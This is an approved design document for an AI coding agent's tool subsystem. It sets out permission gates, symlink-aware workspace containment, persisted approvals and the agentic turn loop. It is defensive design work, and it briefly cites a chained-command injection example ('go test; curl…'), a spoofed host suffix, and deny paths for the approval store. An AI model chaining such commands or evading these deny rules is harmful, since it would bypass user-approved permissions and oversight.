# Tools — Design

Date: 2026-06-14 · Status: approved (brainstorm)

> **Revision 2026-06-14 (review pass)** resolves a code review of the first draft:
> (1) **fail-secure permission ordering** — containment + hard-deny now precede all
> approval stages, so no `EffectChecker`/`HardApprove`/persisted grant can bypass a
> deny (§3c); (2) **symlink-aware containment** — `EvalSymlinks` + `O_NOFOLLOW` +
> `filepath.Rel`, matching the TUI attachment hardening (§3c); (3) **approval
> persistence** — `PermissionGate.Grant` writes workspace approvals; the command
> stays `CallID`+`Scope` (§3b, §2c); (4) **per-gate reply channel** keyed by
> `CallID`, replacing the drop-prone shared buffer-1 `turnReplies` (§2c);
> (5) **tool-result shape** — `ToolMessage{Blocks: result.Content}`, since the
> encoder serialises only `TextBlock` and a `ToolResultBlock` would be empty (§2a);
> (6) **streaming tool-call delta type** — index + string-fragment arguments, since
> the current SSE type reuses the non-streaming shape (§2b); (7) **thinking-block
> claim clarified** — in-memory only; the encoder drops it on the wire (§2a);
> (8) **Bash** kept as a shell-string tool with a *documented* security exception,
> the denylist reframed as advisory (§4b); (9) **Terminate vs. abort** wording
> reconciled (§2a, §2d).
>
> **Revision 2026-06-14 (review pass 2)** resolves a second review: (1) all
> `PermissionRequest` concrete types (incl. `UnknownRequest`) **moved into
> `internal/tool`** — a `tools/`-side type can't implement the unexported
> `permissionRequest()` marker, and `loop` needs the fallback (§3a, §1); (2) gate
> registration made **synchronous** (register → actor ack → emit) to close the
> install-before-emit race (§2c); (3) `pendingGate` → **`pendingGates map[CallID]`**
> since auto-approved `AskUser` gates can be open concurrently during parallel
> execution (§2c); (4) session `Approve/Deny/ProvideUserInput` take **`ctx` + return
> `error`** (unbuffered `Commands` could block forever) (§5c, §5d); (5) approval
> match **generalized** to a tool-interpreted `Match` so `Fetch`/`WebSearch` grants
> are representable (§3b, §3c); (6) observability events carry a **redacted `Summary`**,
> never raw `ArgsJSON` (§2d, §5b); (7) the god-object `ToolDeps` **split** into a
> runner-side `ToolSet` + **narrow per-tool deps** (least privilege; supersedes 7.md
> Rule 2) (§3b, §4a, §4d); (8) `Glob`/`Grep` **exclude `DeniedReadPaths`** from
> traversal/results (§4b).
>
> **Revision 2026-06-14 (review pass 3)** resolves a third review: (1) gate
> registration send **and** ack are **ctx-aware** (`select … <-ctx.Done()`) so the
> turn goroutine can't wedge on actor exit (§2c); (2) `pendingGates` stores a **gate
> kind** — permission gates accept only approve/deny, `AskUser` only provide-input —
> so a colliding-`CallID` wrong-kind command can't consume a gate (§2c); (3)
> `PathDenier` → **`ReadGuard{DeniedRead, MaxReadBytes}`** so read tools can enforce
> the byte cap under narrow deps (§3b); (4) **write-side symlink TOCTOU** documented
> as out-of-threat-model (local single-user tool) with `O_EXCL\|O_NOFOLLOW` temp as
> defence-in-depth; `openat`/dirfd noted as a future option (§3c, §4b); (5) **`Match`
> canonical semantics** — exact/`.suffix` host (no `example.com.evil`), https default,
> workspace-relative canonical path globs (§3c); (6) **integration tests**
> (`//go:build integration`) for filesystem tools + Fetch/WebSearch boundaries (§5e).
>
> **Revision 2026-06-14 (review pass 4)** resolves a fourth review: (1) a **`Grant`
> failure never blocks execution** — the call was approved; persistence is best-effort
> + warns (§2c); (2) **v1 tool results are text-only** — the runner flattens non-text
> blocks to a visible placeholder, no silent loss (§2a); (3) **Grep `rg` arg-list
> hardening** (`--regexp <pat> -- <path>`) against flag injection (§4b); (4) **Subagent
> hard max-depth** (default 2, via `ctx`) ships now (§4b); (5) **Fetch host match uses
> normalized `Hostname()`** (port-excluded, IDNA/punycode via `x/net/idna`) (§3c);
> (6) **`Effect` (un)marshals as `"allow"/"ask"/"deny"`** in the user-editable file,
> unknown → error (§3b).
>
> **Revision 2026-06-14 (review pass 5)** resolves a fifth review: (1) **sink path is
> redacted** while the TUI stream stays full-fidelity — `PermissionRequested`/
> `UserInputRequested` carry sensitive text only to the TUI, a `Redactable.SinkProjection`
> strips it for sinks (§5b); (2) **Grep denied-path enforcement is two-layer** — `rg
> --glob '!…'` exclusions *plus* an authoritative `ReadGuard.DeniedRead` output filter
> (§4b); (3) **TUI prompt queue keyed by `CallID`** since concurrent `AskUser` gates
> can coexist (§5d); (4) **malformed approvals fail open to `EffectAsk`, never
> `AutoApprove`** (`Check` has no error return; bad file → empty stage + warn, bad
> record → skipped) (§3c).
>
> **Revision 2026-06-14 (review pass 6)** resolves a sixth review (two High security):
> (1) **workspace approvals leave the repo** → `~/.urvi/workspaces/<hash>/approvals.json`
> so a cloned repo can't ship policy; **deny beats allow** across records (§3c, §1);
> (2) **the policy store is deny-write** — `**/.urvi/**` + `~/.urvi/**` in
> `DeniedWritePaths` (and `~/.urvi/**` deny-read) so only `Grant` mutates approvals
> (§3c); (3) **Bash grants are exact-match** by default; prefix is a hand-edited
> `"prefix": true` opt-in (no `go test` → `go test; curl…`) (§3c); (4) **assembled
> tool calls are validated** (ID/Name/valid-JSON) before append — invalid → `Input`
> sanitized to `{}` + tool-result error, never poisoned history (§2b).
>
> **Revision 2026-06-14 (review pass 7)** resolves a seventh review: (1) **runaway
> guard** — `MaxToolIterations`/`MaxToolCallsPerTurn` bound the agentic loop, exceed →
> controlled `TurnFailed{ToolLimitError}` (§2a, §3b); (2) test-section precedence
> corrected to **deny-beats-allow** (§5e); (3) **Fetch persisted match = method +
> scheme + host** (+ opt-in path-prefix), so a GET grant can't approve later POSTs
> (§3c); (4) **policy-store fs hardening** — `0700`/`0600`, `O_EXCL\|O_NOFOLLOW` temp,
> reject symlinked policy-path components, reject group/world-writable files (§3c);
> (5) clarified `Cache[T any]` is the permitted type-parameter idiom (not banned
> `any`) and is required by the layering; concrete alternative noted (§3d).
>
> **Revision 2026-06-14 (review pass 8)** resolves a seventh-pass follow-up:
> (1) the runaway guard no longer leaves malformed history — the cap is checked
> *before* appending the assistant-with-tool-calls message, and **rollback is
> generalized to the whole turn** (snapshot `base`; any `TurnFailed`/`TurnInterrupted`
> truncates `msgs[:base]`), so no unpaired `tool_use` can persist; the wrong
> "stays in history" claim is removed (§2a); (2) stale match descriptions in
> `ToolPolicy`, the `ApprovalRecord` comment, and the test section updated to exact-Bash
> + the Fetch `METHOD scheme://host` grammar (§3b, §3c, §5e).

## Scope

The agent **tools** subsystem: an agent-agnostic set of built-in tools, the
seven-stage permission model that governs them, workspace containment, the
agentic tool-use turn loop, and the two agent manifests that consume them
(`agents/personal-assistant`, the safe read/web subset; `agents/coding`, the full
set).

It is a port of `docs/old/7.md` (the "Nexus" coding-agent tools spec) onto the
current "urvi" codebase, which has diverged substantially. It depends on the
identity model in `docs/plans/2026-06-14-identity-correlation-design.md`
(referenced here as *identity doc*) for `TurnID`, `CallID`, the command `Header`,
and the event envelope.

**Tool count: 11.** `ReadFile, WriteFile, EditFile, Bash, Glob, Grep, Fetch,
WebSearch, AskUser, Todo, Subagent`. `ShellSession` is deferred (see *Out of
scope*).

### Decisions locked in (this brainstorm)

| Decision | Choice |
|---|---|
| Tool set | Agent-agnostic; manifests select. Full set ported (ShellSession deferred) |
| Coding agent | New `agents/coding` manifest with the full set; reuses `llm.ChutesKimiK2()` for v1 |
| Prompt UX | Loop emits typed events; TUI surfaces them. This doc defines the event/command contract + an integration section; detailed TUI rendering deferred to a TUI-update doc |
| Persistence | Full seven-stage model incl. disk-persisted approvals; build `internal/hashcache` |
| Identity | Per-message IDs via the *identity doc*; tools consume `TurnID` + `CallID` |
| Impl package | Root-level `tools/`; contracts in `internal/tool/` |
| Glob `**` | Stdlib `WalkDir` + per-segment matcher (no new dep) |
| WebSearch | `golang.org/x/net/html` approved for the DuckDuckGo scrape |
| `StreamableTool` | Dropped — no `internal/graph` in this codebase |

---

## Key divergences from 7.md

| 7.md assumption | Current reality | Consequence |
|---|---|---|
| `content.Block` struct with `Type` field; `FunctionToolResult` | Sealed `Block` interface; `ToolUseBlock{ID,Name,Input}`, `ToolResultBlock{ToolUseID,Content []Block,IsError}` exist | `ToolResult.Content` is `[]content.Block`; reuse existing tool blocks |
| `client/` holds prompt view-models | No `client/` layer; TUI drives the loop directly | View-model building moves to `tui/`; this doc defines the contract only |
| `loop.Loop` has always-open `Commands` + `Events` | Actor loop: `Commands chan<- command.Command`; per-turn `StartTurn.Events`; `loopState` | Approve/Deny/Provide are new commands; `listen` relays them to the active turn |
| `internal/graph.ToolsNode` needs `StreamableTool` | No graph package | Drop `StreamableTool`; only `InvokableTool` |
| `llm` tool defs `map[string]any` | `llm.Request.Tools []Tool{Name,Description,Schema json.RawMessage}` exists | Tool defs already plumbed + typed; `ToolInfo.Schema` is `json.RawMessage` |
| `ToolDeps.Events` session-wide channel | events flow per-turn | tool-emitted events injected via `ctx` (see §4a) |
| `.nexus/…` in-repo approvals | project is "urvi"; in-repo policy is a supply-chain hole | workspace approvals live **outside** the repo at `~/.urvi/workspaces/<hash>/approvals.json`; user-level `~/.urvi/approvals.json` |
| `internal/hashcache` already in repo | does not exist | built here |
| `Stream` surfaces tool calls | `Stream` yields only `TextChunk`/`ThinkingChunk` | add `content.ToolUseChunk` (§2b) |

---

## §1 — Package layout & layering

Strictly low→high, additive, no cycles:

```
internal/content/                  Block (+ ToolUseBlock, ToolResultBlock), Chunk (+ ToolUseChunk)
    ↑                  ↑
internal/tool/      internal/llm/  contracts: BaseTool, InvokableTool, ToolResult, ToolInfo,
    ↑                              PermissionRequest (sealed) + ALL its concrete types
    │                              (FileWriteRequest…UnknownRequest), PermissionPrompter,
    │                              ApprovalScope, Sequential, ToolMiddleware — imports content only
internal/agent/loop/event/         + PermissionRequested(tool.PermissionRequest), UserInputRequested,
    ↑                                ToolCallStarted, ToolCallCompleted
internal/agent/loop/               runner.go, deps.go (ToolSet, PermissionGate, ReadGuard, Effect, ToolPolicy),
    ↑                ↑               EmitFromContext; command/ + Approve/Deny/Provide; turn.go agentic loop
tools/            internal/hashcache/   11 impls, PermissionChecker, SearchProvider; hashcache backs approvals
    ↑
agents/coding/   agents/personal-assistant/   manifests select tool set + prompt + model
    ↑
cmd/cli/                           composition root (registry → agent → TUI)
```

- **`internal/tool` imports only `internal/content`** — never `loop`.
  `PermissionPrompter.BuildRequest` returns `tool.PermissionRequest`, a sealed
  interface with no loop dependency.
- **`EffectChecker` lives in `tools/`** (returns `loop.Effect`), keeping contracts
  loop-free.
- **`loop` never imports `tools/`.** The concrete `*tools.PermissionChecker` and
  `[]tool.InvokableTool` registry are injected via `loop.Config.Tools` (`ToolSet`)
  at the composition root; the runner dispatches through interfaces only.
- **`tools/` is root-level** (alongside `internal/`, `agents/`, `cmd/`); it imports
  `urvi/internal/...` freely. `Subagent` imports `internal/agent/session`
  (session wraps loop; acyclic).

---

## §2 — The agentic turn loop

### §2a. `runTurn` becomes a loop

Today `runTurn` (`internal/agent/loop/turn.go:21`) streams once and returns. It
becomes the agentic loop, re-streaming after each tool batch until the model stops
calling tools:

```
base := len(msgs)                       // pre-turn snapshot for whole-turn rollback
append user message to msgs; emit TurnStarted
iters, calls := 0, 0
for {
    req := llm.Request{Model: cfg.Model, Messages: msgs, Tools: toolDefs(cfg.Tools.Registry)}
    stream := client.Stream(ctx, req)
    // accumulate: TextChunk/ThinkingChunk → emit TokenDelta (unchanged)
    //             ToolUseChunk           → fold by Index into []ToolUseBlock (validate, §2b)
    if iters+1 > MaxToolIterations || calls+len(toolUseBlocks) > MaxToolCallsPerTurn {
        msgs = msgs[:base]; emit TurnFailed(&ToolLimitError{…}); return   // roll back BEFORE appending
    }
    assemble AIMessage{Blocks: [thinking…, text, toolUse…]}; append to msgs
    if no tool_use blocks { emit TurnDone(msg); return }
    iters++; calls += len(toolUseBlocks)
    results := runner.RunBatch(ctx, toolUseBlocks, cfg.Tools, gateReg, emit)
    for each result: append content.ToolMessage{ToolUseID, Blocks: flattenToText(result.Content)} to msgs
    if any result.Terminate { emit TurnDone(lastAIMessage); return }
}
// on ctx-cancel / interrupt anywhere above: msgs = msgs[:base]; emit TurnInterrupted; return
```

**Runaway guard.** `MaxToolIterations` (LLM↔tool round-trips) and
`MaxToolCallsPerTurn` (total executions) bound the loop so a stuck model can't run
auto-approved tools forever. The cap is checked **before** the offending
assistant-with-tool-calls message is appended, and on `ToolLimitError` the **whole
turn is rolled back** to `base` — so history can never contain a `tool_use` block
without its matching `ToolMessage` (an unpaired call would make the next provider
request unencodable). Defaults (25 / 100) applied by `loop.New` when the `ToolSet`
fields are zero.

**Generalized rollback contract.** The single-stream `runTurn` rolled back just the
user message (`msgs[:len(msgs)-1]`). The agentic loop appends many messages per turn,
so rollback is generalized: snapshot `base := len(msgs)` at turn start; **any** abnormal
exit — `TurnFailed` (including `ToolLimitError`) or `TurnInterrupted` — truncates
`msgs = msgs[:base]`, discarding the *entire* turn's exchange. Only a `TurnDone` path
keeps the turn in history (and only well-formed, paired exchanges reach a `TurnDone`).
The TUI keeps its own display transcript (TUI design), so the human still *sees* the
interrupted/failed exchange even though the model's context drops it — the existing
`TurnFailed`/`TurnInterrupted` behavior, now applied to the multi-message turn.

- `toolDefs` maps each registered tool's `Info(ctx)` → `llm.Tool{Name,
  Description, Schema}`. `ToolInfo.Schema` is `json.RawMessage` (1:1 with
  `llm.Tool.Schema`; no `map[string]any`).
- **Tool-result message shape (v1 text-only).** Each result is appended as
  `content.ToolMessage{ToolUseID: <the tool_use id>, Blocks: <flattened>}` — the
  result's blocks go *directly* in the `ToolMessage`, **not** wrapped in a
  `content.ToolResultBlock`. The OpenAI-style encoder serialises a `ToolMessage` via
  `textContent`, which extracts only `*content.TextBlock`
  (`internal/llm/openaiapi/encode.go:90`,`:103`); other block types serialise to
  **empty**. So `ToolResult.Content` stays `[]content.Block` (future-proof), but for
  v1 the runner **flattens it to text before appending** — `TextBlock`s pass through;
  any non-text block becomes a visible `"[unsupported tool-result block: <type>]"`
  text placeholder so nothing **silently** vanishes. `result.Content` empty → an
  `"error: empty result"` text block. Image-in-tool-result and `IsError` on the wire
  are deferred to a provider that supports them (which would carry the blocks through
  instead of flattening). Tools should return `TextBlock`(s) in v1.
- **Thinking blocks** are retained in the in-memory assistant message (for display
  and a future Anthropic-style signature-replay provider) — the runner does not
  strip them. But the current OpenAI-style encoder **deliberately drops** them on
  the wire (`encode.go:165`), so provider replay of thinking is *not* something to
  rely on with today's providers (lmstudio/phala/chutes). "Preserved" here means
  internal history, not wire replay.
- **History-rollback is generalized** to the whole turn (snapshot `base` above): any
  abnormal exit truncates `msgs[:base]`; only a `TurnDone` path keeps the (well-formed,
  fully paired) exchange. See the *Generalized rollback contract* note above.
- **Turn completion vs. abort.** The agentic loop completes *normally* (emits
  `TurnDone`) on either of two paths: the model returns no tool calls, or a tool
  result sets `Terminate`. The things that *abort* a turn — no `TurnDone`, whole-turn
  rollback — are `ctx` cancellation / `Interrupt` (`TurnInterrupted`) and the runaway
  guard (`TurnFailed{ToolLimitError}`). (See §2d; "tool failures never terminate"
  means a tool *error* never aborts, not that `Terminate` can't complete.)

### §2b. Streaming tool calls — `content.ToolUseChunk`

`Stream` yields only `TextChunk`/`ThinkingChunk` today, so tool calls never reach
the loop. Add one sealed `Chunk` variant:

```go
// ToolUseChunk is a streaming delta of a tool call. Providers emit these as they
// parse function-call deltas; the runner accumulates by Index into a ToolUseBlock.
type ToolUseChunk struct {
    Index     int    // tool call's position in the response
    ID        string // tool_use id (may arrive only on the first delta for this Index)
    Name      string // tool name (likewise)
    InputJSON string // partial JSON delta of the arguments
}
func (*ToolUseChunk) isChunk() {}
```

`internal/llm/openaiapi` emits these; `runTurn` folds them by `Index` into
`content.ToolUseBlock{ID, Name, Input: json.RawMessage}`. Because `ToolUseChunk`
rides the existing `TokenDelta{Chunk}` event, the in-flight TUI needs **zero
change** — it already type-switches on `Chunk` and skips non-`TextChunk` variants.

**Provider-layer change (required).** The current `sseMessageDelta.ToolCalls`
reuses the *non-streaming* `toolCall` shape — `Function.Arguments` is a complete
`json.RawMessage` and there is **no `index`** (`internal/llm/openaiapi/types.go:91`).
Real OpenAI streaming deltas carry a per-call `index` and deliver `arguments` as
**string fragments** across many deltas. So the provider gains a streaming-specific
delta type, e.g.:

```go
type sseToolCallDelta struct {
    Index    int    `json:"index"`
    ID       string `json:"id"`               // first delta only
    Function struct {
        Name      string `json:"name"`         // first delta only
        Arguments string `json:"arguments"`    // FRAGMENT — concatenate across deltas
    } `json:"function"`
}
```

`sseMessageDelta.ToolCalls` switches to `[]sseToolCallDelta`; the provider maps
each into a `content.ToolUseChunk` (the `InputJSON` field carries the raw argument
fragment), and `runTurn` concatenates fragments per `Index` before
`json.RawMessage(accumulated)` becomes the `ToolUseBlock.Input`.

**Validate before appending — never poison history.** After folding the fragments,
`runTurn` validates each assembled `ToolUseBlock` *before* appending the assistant
message: `ID` and `Name` non-empty, and `json.Valid(Input)`. A malformed call (the
provider truncated/garbled the argument fragments) must not produce an assistant
message whose `ToolUseBlock.Input` is invalid JSON, because the **next** provider
request would then re-encode unencodable history. On an invalid call the runner:
(1) **sanitizes the stored `Input` to `{}`** so the message stays encodable; (2) does
**not** execute that call; (3) appends a `ToolMessage` tool-result error for it
(`"error: malformed tool call (invalid JSON arguments)"`) so the model can correct
and retry on the next loop iteration. If the *entire* response is unparseable (no
recoverable calls), the turn ends in a controlled `TurnFailed`
(`event.EmptyResponseError`-style) rather than a poisoned, half-encoded history.

### §2c. Permission / AskUser reply plumbing (actor-model remap)

Three additions remap 7.md's `activeTurn.replies` onto the current actor.

**New control commands** (`internal/agent/loop/command/`, each embeds the identity
doc's `Header`):

```go
type ApproveToolCall  struct { Header; CallID uuid.UUID; Scope tool.ApprovalScope }
type DenyToolCall     struct { Header; CallID uuid.UUID }
type ProvideUserInput struct { Header; CallID uuid.UUID; Answer string }
// each: isCommand()  — fire-and-forget control commands (no Ack)

// All three expose the gate they answer via a small accessor, so listen can match
// without a type switch: GateCallID() uuid.UUID { return c.CallID }.
```

**Per-gate reply channel, registered with the actor, filtered by active `CallID`.**
A single shared `turnReplies` channel with buffer 1 and a non-blocking send is
**unsafe**: a stale or duplicate command (e.g. a double key-press, or a late
approval for a *previous* gate) fills the buffer, and the real approval's send then
hits `default` and is silently dropped — the runner blocks until ctx-cancel. So
instead:

- **Multiple gates can be open at once.** Permission *gates* are resolved
  sequentially, but `AskUser` is auto-approved and blocks for input *during parallel
  execution* — so two `AskUser` calls in one batch can be waiting simultaneously. A
  single `pendingGate` would collide. `loopState` holds
  `pendingGates map[uuid.UUID]gate` (CallID → gate), owned solely by `listen`, where
  a gate records both the reply channel **and the kind of command it accepts**:

```go
type gateKind uint8
const ( gatePermission gateKind = iota; gateUserInput )
type gate struct { reply chan<- command.Command; kind gateKind }
```

- **Registration is synchronous and ctx-aware** (closes the install-before-emit
  race without wedging on actor exit): the runner creates
  `reply := make(chan command.Command, 1)` and registers, selecting on `ctx.Done()`
  for both the send and the ack wait:

```go
select {
case gateReg <- gateRegistration{callID, reply, kind, ack}:
case <-ctx.Done(): return ctx.Err()            // actor gone / turn cancelled — no wedge
}
select {
case <-ack:                                     // gate installed in pendingGates
case <-ctx.Done(): return ctx.Err()
}
```
  Only then does the runner emit `PermissionRequested`/`UserInputRequested` and block
  on `<-reply` / `<-ctx.Done()`. The ack guarantees the gate is installed before the
  request can reach the TUI, so no reply is dropped on a race.
- `listen` routes a control command to the matching gate **only if the command kind
  matches the gate kind**, delivering once on the gate's dedicated buffered(1)
  channel (runner is sole reader → never blocks, never drops the match):

```go
case gateRegistration:                 // {callID, reply, kind, ack} from the runner
    state.pendingGates[reg.callID] = gate{reg.reply, reg.kind}
    close(reg.ack)                      // unblock the runner: gate is installed

case command.ApproveToolCall, command.DenyToolCall, command.ProvideUserInput:
    g, ok := state.pendingGates[cmd.GateCallID()]
    if ok && accepts(g.kind, cmd) {     // approve/deny ↔ gatePermission; provide ↔ gateUserInput
        g.reply <- cmd
        delete(state.pendingGates, cmd.GateCallID())
    }                                   // else: no gate / wrong CallID / wrong kind — drop (fail-safe)
```

On turn end / cancellation `listen` clears `pendingGates` (any parked runner already
unblocks via `<-ctx.Done()`).

**The runner** generates a `CallID` (`uuid.New`) per tool call, injects it into
`ctx` (package-private key), then:

1. `effect := cfg.Tools.Permission.Check(ctx, t, name, argsJSON)`.
2. If `EffectAsk`: build the typed request
   (`t.(tool.PermissionPrompter).BuildRequest` or fallback `UnknownRequest`),
   **register the gate synchronously** as `gatePermission` (ctx-aware send + ack, as
   above), *then* emit `event.PermissionRequested{CallID, Request}`, then block on
   `<-reply` / `<-ctx.Done()`. (`CallID` is re-validated on receipt as cheap
   defence.) On approval with `Scope != ScopeOnce` the runner calls
   `gate.Grant(ctx, toolName, argsJSON, scope)` (§3b) using the `toolName`+`argsJSON`
   it retained for *this* gate — so the command needs only `CallID`+`Scope`. **A
   `Grant` error never blocks execution**: the user already approved *this* call, and
   `Grant` is best-effort persistence for *future* calls. On failure the runner
   proceeds with the approved execution (effectively `ScopeOnce` for persistence) and
   surfaces a non-fatal warning (log line / sink event) so the user knows the
   session/workspace grant did not stick — it is neither a deny nor a tool-result
   error.
3. `AskUser` registers a `gateUserInput` gate the same way for `ProvideUserInput`.
   Because gates are keyed by `CallID` *and* matched by kind, several `AskUser` calls
   in one parallel batch each get their own entry and never collide, and a stray
   approve/deny can never satisfy an `AskUser` gate (or vice versa).

The `loopState` invariant is preserved: only `listen` touches `loop.Commands` and
`loopState`; it *routes* the matching control command to the parked runner on that
gate's dedicated reply channel.

#### Two channels, opposite directions

The request goes **out** as an event on the per-turn `Events` channel; the decision
comes **in** as a command on the permanent `Commands` channel; `listen` matches it
against the open gate by `CallID` and delivers it to the parked runner on that
gate's dedicated reply channel.

```
                          ┌──────────────────── Loop actor ────────────────────┐
TUI ──Approve(callID)──► session ──► loop.Commands (inbound, always open) ─► listen()
                                                                               │ owns loopState
                                                                               │ pendingGates[CallID] (per-gate reply chan)
                                                                               ▼
                                                                            runTurn goroutine
                                                                            (runner blocked on a gate)
TUI ◄── r.Next() ── session ◄── StartTurn.Events (outbound, per-turn) ◄──── emit(PermissionRequested)
```

End-to-end: TUI key `w` → `agent.Approve(callID, ScopeWorkspace)` →
`session.Approve` → `loop.Commands <- ApproveToolCall` → `listen` (matches active
`CallID`) → gate reply channel → runner unblocks. `PermissionRequested` is just
another event interleaved with `TokenDelta`; the runner then parks while `listen`
keeps draining.

### §2d. Runner batching, middleware, panic recovery

`internal/agent/loop/runner.go`:

- **Permission is resolved sequentially across all calls first** — a session-scope
  grant on call *N* is visible to call *N+1*'s `Check`.
- Execution then splits into a **serial batch** (tools where `Sequential()==true`)
  that drains before a **semaphore-bounded parallel batch**. (No built-in
  implements `Sequential` yet; it is the documented seam for ShellSession.)
- The `tool.ToolMiddleware` chain wraps each `InvokableRun` (first listed =
  outermost). Cross-cutting concerns (OTel spans, rate limiting, audit, caching,
  per-tool timeout) live here, not in the runner body.
- `defer/recover` turns a panic into `"error: tool panicked: <detail>"`.
- **All tool failures become tool-result strings** (invalid args, permission
  denied, execution error, panic) — a tool *error* never aborts the turn; the model
  sees it and can react. The turn *completes normally* (`TurnDone`) when the model
  emits no more tool calls or a result sets `Terminate` (§2a). The only things that
  *abort* a turn (no `TurnDone`; `TurnInterrupted`) are `ctx` cancellation and
  `Interrupt`.

**Observability events** (auto-approved tools execute silently otherwise):
`event.ToolCallStarted{CallID, ToolName, Summary string}` before run,
`event.ToolCallCompleted{CallID, IsError}` after. **`Summary` is a redacted, capped
safe string — never raw `ArgsJSON`** (which can hold write-file contents, `Fetch`
auth headers/cookies, a `Bash` command with an inline token, or PII; CLAUDE.md: *log
security events, not secrets*). Tools supply it via an optional
`tool.Auditable interface { AuditSummary(argsJSON string) string }`; a tool with no
`AuditSummary` yields just its name. Per-tool redaction: `WriteFile` →
`"WriteFile <path> (<n> bytes)"` (no content); `Fetch` → `"<METHOD> <host>"` (no
headers/body); `ReadFile`/`Grep`/`Glob` → path/pattern only. Both events carry
`CallID`; today's TUI ignores unknown event types (additive).

### §2e. Tool events via `ctx` (replaces 7.md's `ToolDeps.Events`)

Since events flow per-turn, the runner injects the active turn's emit func into
`ctx` (alongside `CallID` + the gate-registration handle). Event-emitting tools retrieve it via a
helper in `loop` (not `internal/tool`, which must stay `event`-free):

```go
// in internal/agent/loop/
func EmitFromContext(ctx context.Context) (func(event.Event), bool)
```

`AskUser` uses it to emit `UserInputRequested`. There is **no session-wide `Events`
field** anywhere (7.md's had one); per-turn emit comes from `ctx`, and the session
root `ctx` is passed at construction only to tools that need it (`Subagent`). With
ShellSession deferred, no tool emits events that outlive a turn.

---

## §3 — Tool contracts, permission model, `hashcache`

### §3a. Contracts — `internal/tool/` (imports only `content`)

```go
type ToolInfo struct {
    Name   string
    Desc   string
    Schema json.RawMessage // JSON Schema; maps 1:1 to llm.Tool.Schema
}
type BaseTool      interface { Info(ctx context.Context) (*ToolInfo, error) } // never widened (Rule 1)
type InvokableTool interface { BaseTool; InvokableRun(ctx context.Context, argsJSON string) (*ToolResult, error) }

type ToolResult struct {
    Content   []content.Block // ≥1 block; runner injects "error: empty result" if nil
    Terminate bool
}
func TextResult(s string) *ToolResult // one TextBlock, Terminate false

// Optional capability interfaces (added, never folded into BaseTool — Rule 1):
type Sequential        interface { Sequential() bool }
type PermissionPrompter interface { BuildRequest(argsJSON string) (PermissionRequest, error) }
type Auditable         interface { AuditSummary(argsJSON string) string } // redacted, capped; for ToolCallStarted

type ToolMiddleware func(ctx context.Context, t InvokableTool, argsJSON string, next ToolExecuteFunc) (*ToolResult, error)
type ToolExecuteFunc func(ctx context.Context, argsJSON string) (*ToolResult, error)
```

Sealed `PermissionRequest` + `ApprovalScope`:

```go
type PermissionRequest interface {
    permissionRequest()
    ToolName() string        // prompt header
    Description() string     // prompt body
    AllowedScopes() []ApprovalScope
}
type ApprovalScope uint8
const (
    ScopeOnce ApprovalScope = iota // approve this call only; nothing persisted
    ScopeSession                   // session policy (in-memory)
    ScopeWorkspace                 // ~/.urvi/workspaces/<hash>/approvals.json (OUT of the repo)
)
```

**The concrete request types live in `internal/tool`, not `tools/`.** Because
`permissionRequest()` is an *unexported* marker, only types in `internal/tool` can
implement `PermissionRequest` (this is the sealing mechanism — a type in `tools/`
*cannot* implement an unexported method from `internal/tool`, and would fail to
compile). So `internal/tool` defines `FileWriteRequest`, `BashRequest`,
`FetchRequest`, `WebSearchRequest`, and the fallback `UnknownRequest{Tool,
Summary}`. A tool's `BuildRequest` (in `tools/`) *constructs* these exported structs
(e.g. `return tool.FileWriteRequest{Path: p}, nil`); it does not define new
implementers. This also lets the runner in `loop` build the `UnknownRequest`
fallback (`loop` imports `internal/tool`, never `tools`). `StreamableTool` is
**dropped**. (`UnknownRequest` carries a redacted `Summary`, not raw args — see
finding-6 fix below.)

### §3b. Consumer surface — `internal/agent/loop/deps.go`

```go
type Effect uint8 // EffectAutoApprove | EffectAsk | EffectDeny
// Effect has custom MarshalJSON/UnmarshalJSON mapping to "allow"/"ask"/"deny" so the
// user-editable approvals.json reads naturally (not opaque 0/1/2); an unknown string
// unmarshals to an error (fail-secure — a malformed approval is not silently allowed).

type ToolPolicy struct {
    Tool   string
    Effect Effect
    Match  []string // tool-interpreted (path glob / EXACT Bash command / "METHOD scheme://host"); empty = all
}

type PermissionGate interface {
    Check(ctx context.Context, t tool.InvokableTool, toolName, argsJSON string) Effect
    // Grant persists an approval at the chosen scope. ScopeSession appends an
    // in-memory ToolPolicy; ScopeWorkspace writes an ApprovalRecord to
    // ~/.urvi/workspaces/<hash>/approvals.json (OUT of the repo — never <ws>/.urvi).
    // The runner passes the toolName+argsJSON it retained for the open gate; the gate
    // derives the record (it already extracts the path/command in Check). ScopeOnce
    // is never passed (no persistence).
    Grant(ctx context.Context, toolName, argsJSON string, scope tool.ApprovalScope) error
}

// ToolSet is the RUNNER's view — the only thing loop.Config carries. Tools never
// see it; they are not handed Permission/Registry/Middlewares (they don't call them).
type ToolSet struct {
    Permission  PermissionGate
    Registry    []tool.InvokableTool // runner looks up by Info().Name, builds toolDefs
    Middlewares []tool.ToolMiddleware
    // Runaway guards (loop.New applies defaults when zero):
    MaxToolIterations   int // max LLM↔tool round-trips per turn (default 25)
    MaxToolCallsPerTurn int // max total tool executions per turn (default 100)
}

// ReadGuard is the narrow read-side policy the read tools enforce themselves:
// DeniedRead filters denied paths in Glob/Grep traversal+results; MaxReadBytes is
// the per-file cap ReadFile/Grep apply via io.LimitReader. Satisfied by
// *tools.PermissionChecker (exposing its HardDeny config). Carrying the cap here
// fixes the orphaned HardDenyRules.MaxReadBytes under narrow deps.
type ReadGuard interface {
    DeniedRead(absPath string) bool
    MaxReadBytes() int64
}
```

`loop.Config` gains `Tools ToolSet`. `EffectChecker` (returns `loop.Effect`) lives
in `tools/`, kept out of `internal/tool`.

**Tools are constructed with narrow, per-family deps — not a god-struct** (this
*supersedes* 7.md's Rule 2 in favour of CLAUDE.md's "never pass a full config when a
narrow interface suffices" / least privilege):

| Tool family | Constructor deps |
|---|---|
| `ReadFile`, `Glob`, `Grep` | `root string`, `ReadGuard` (filter denied paths in traversal/results; `ReadFile`/`Grep` enforce `MaxReadBytes`) |
| `WriteFile`, `EditFile`, `Bash` | `root string` (resolve path/workdir under it) |
| `Fetch`, `WebSearch` | `*http.Client` (timeouts + `MinVersion: TLS1.2`); **no filesystem access at all** |
| `AskUser`, `Todo` | none (use `ctx` / in-memory state) |
| `Subagent` | a child-agent `Factory` + the session root `context.Context` (also carries the current spawn depth; see §4b) |

The win is real least privilege: a web tool literally cannot reach the workspace
root, and `Todo` cannot touch the registry. The cost — adding a *shared* dep touches
the relevant family rather than one struct — is the deliberate trade. The session
root `ctx` (for `Subagent`) is the manifest's `rootCtx`, already in hand at
construction (it builds tools before `session.NewAgent(rootCtx, cfg)`).

